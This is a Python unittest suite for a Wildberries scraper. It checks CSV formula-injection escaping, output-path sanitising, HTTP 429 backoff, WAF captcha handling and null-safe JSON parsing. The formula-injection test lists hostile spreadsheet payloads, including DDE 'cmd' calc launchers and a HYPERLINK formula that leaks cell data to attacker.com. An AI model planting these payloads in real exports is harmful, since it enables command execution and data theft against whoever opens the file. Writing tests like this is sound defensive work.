#!/usr/bin/env python3
"""
==============================================================================
Security & Stress-Test Suite for Wildberries_Fast_Scraper
==============================================================================
Автор: V1PER (viper86rus-arch)
GitHub: https://github.com/viper86rus-arch/Wildberries_Fast_Scraper
Лицензия: MIT License (2026)
Назначение: Автоматизированная проверка защищённости от CWE-1236, CWE-22,
            WAF/Rate-Limiting устойчивости и Null-safety JSON парсера.
==============================================================================
"""

import csv
import io
import json
import os
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, patch
import urllib.error

PROJECT_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(PROJECT_ROOT))

import wb_scraper
from wb_scraper import (
    ProductItem,
    WildberriesScraper,
    _sanitize_csv_cell,
    _sanitize_output_path,
    export_to_csv,
    export_to_json,
)


class TestSecurityAndStressWBScraper(unittest.TestCase):
    """Комплексный стресс-тест безопасности и отказоустойчивости."""

    def setUp(self):
        self.scraper = WildberriesScraper(timeout=2.0)

    # =========================================================================
    # 1. ТЕСТ: Защита от CSV Formula Injection (CWE-1236)
    # =========================================================================
    def test_csv_formula_injection_defense(self):
        """
        Проверка нейтрализации формул Excel (CWE-1236).
        Все ячейки с опасными префиксами (=, +, -, @, \\t, \\r) должны экранироваться апострофом.
        """
        malicious_payloads = [
            "=cmd|' /C calc'!A0",
            "@SUM(1+1)*cmd|' /C calc'!A0",
            "-2+3+cmd|' /C calc'!A0",
            "+100-cmd|' /C calc'!A0",
            "=HYPERLINK(\"https://attacker.com/leak?d=\"&A1, \"Скидка 99%\")",
            "\t=1+1",
            "\r=1+1",
        ]

        items = []
        for i, payload in enumerate(malicious_payloads):
            items.append(
                ProductItem(
                    sku=1000000 + i,
                    title=f"Кроссовки {payload}",
                    brand=payload,
                    rating=4.9,
                    feedbacks=10,
                    price_original=5000.0,
                    price_spp=3500.0,
                    discount_percent=30,
                    total_stock=15,
                    stocks_by_warehouse={"Коледино": 15},
                )
            )

        with tempfile.NamedTemporaryFile(suffix=".csv", delete=False) as tf:
            temp_path = Path(tf.name)

        try:
            export_to_csv(items, temp_path)
            dangerous_prefixes = ("=", "+", "-", "@")
            unshielded_rows = []

            with temp_path.open("r", encoding="utf-8-sig") as f:
                reader = csv.reader(f, delimiter=";")
                headers = next(reader)
                for line_no, row in enumerate(reader, start=2):
                    for col_idx, raw_col in enumerate(row):
                        clean = raw_col.strip()
                        if clean and clean[0] in dangerous_prefixes:
                            unshielded_rows.append(
                                f"Строка {line_no}, колонка {col_idx} ({headers[col_idx]}): '{clean}'"
                            )

            self.assertEqual(
                len(unshielded_rows),
                0,
                f"Обнаружены неэкранированные формулы CSV: {unshielded_rows}",
            )
        finally:
            if temp_path.exists():
                temp_path.unlink()

    # =========================================================================
    # 2. ТЕСТ: Сетевая устойчивость (HTTP 429 Retry Backoff)
    # =========================================================================
    @patch("time.sleep")
    @patch("urllib.request.OpenerDirector.open")
    def test_http_429_retry_and_backoff(self, mock_open, mock_sleep):
        """Проверка повторных попыток с экспоненциальным бэкоффом при HTTP 429."""
        valid_response = io.BytesIO(
            json.dumps({"data": {"products": [{"id": 99999, "name": "Тест"}]}}).encode("utf-8")
        )
        mock_ok = MagicMock()
        mock_ok.read.return_value = valid_response.getvalue()
        mock_ok.__enter__.return_value = mock_ok
        mock_ok.__exit__.return_value = None

        http_429 = urllib.error.HTTPError(
            url="https://search.wb.ru",
            code=429,
            msg="Too Many Requests",
            hdrs={},
            fp=io.BytesIO(b'{"message": "rate limit"}'),
        )

        # 1-я и 2-я попытка — 429, 3-я попытка — успешный ответ
        mock_open.side_effect = [http_429, http_429, mock_ok]

        result = self.scraper.fetch_search_page("кроссовки", page=1, max_retries=3)
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].sku, 99999)
        self.assertEqual(mock_sleep.call_count, 2)

    # =========================================================================
    # 3. ТЕСТ: Обработка HTML WAF Captcha вместо JSON
    # =========================================================================
    @patch("urllib.request.OpenerDirector.open")
    def test_html_waf_captcha_graceful_handling(self, mock_open):
        """Проверка реакции на Cloudflare / WAF HTML капчу вместо JSON."""
        html_response = (
            b"<!DOCTYPE html><html><head><title>Just a moment...</title></head>"
            b"<body><h1>Checking your browser before accessing wb.ru</h1></body></html>"
        )
        mock_resp = MagicMock()
        mock_resp.read.return_value = html_response
        mock_resp.__enter__.return_value = mock_resp
        mock_resp.__exit__.return_value = None
        mock_open.return_value = mock_resp

        result = self.scraper.fetch_search_page("кроссовки", page=1)
        self.assertEqual(result, [])

    # =========================================================================
    # 4. ТЕСТ: Устойчивость JSON-парсера к Null-значениям (Null-Safety)
    # =========================================================================
    def test_json_parsing_null_safety(self):
        """Проверка абсолютной устойчивости _parse_products ко всем типам Null и сдвигам схемы."""
        anomalous_items = [
            {"id": 10001, "name": None, "brand": None, "rating": None, "feedbacks": None},
            {"id": 10002, "name": "Кроссовки", "sizes": None},
            {"id": 10003, "name": "Кроссовки", "sizes": [None]},
            {"id": 10004, "name": "Кроссовки", "sizes": [{"price": None}]},
            {"id": 10005, "name": "Кроссовки", "sizes": [{"price": {"basic": None, "total": None}}]},
            {"id": 10006, "name": "Кроссовки", "sizes": [{"stocks": None}]},
            {"id": 10007, "name": "Кроссовки", "sizes": [{"stocks": [None]}]},
            {"id": 10008, "name": "Кроссовки", "sizes": [{"stocks": [{"qty": None, "wh": None}]}]},
            "не_словарь_а_строка",
            None,
        ]

        # Парсер обязан обработать все аномалии без единого исключения
        parsed = self.scraper._parse_products(anomalous_items)
        self.assertEqual(len(parsed), 8)
        self.assertEqual(parsed[0].title, "Без названия")
        self.assertEqual(parsed[0].brand, "Без бренда")
        self.assertEqual(parsed[0].rating, 0.0)
        self.assertEqual(parsed[0].feedbacks, 0)
        self.assertEqual(parsed[0].price_original, 0.0)
        self.assertEqual(parsed[0].total_stock, 0)

    # =========================================================================
    # 5. ТЕСТ: Защита выходного пути (Path Traversal / Extensions)
    # =========================================================================
    def test_output_path_sanitization(self):
        """Проверка валидации расширения и нормализации пути отчётов."""
        # Разрешенные расширения
        p_csv = _sanitize_output_path(Path("test.csv"))
        self.assertTrue(str(p_csv).endswith(".csv"))

        p_json = _sanitize_output_path(Path("test.json"))
        self.assertTrue(str(p_json).endswith(".json"))

        # Запрещенные расширения
        with self.assertRaises(ValueError):
            _sanitize_output_path(Path("payload.sh"))

        with self.assertRaises(ValueError):
            _sanitize_output_path(Path("payload.exe"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
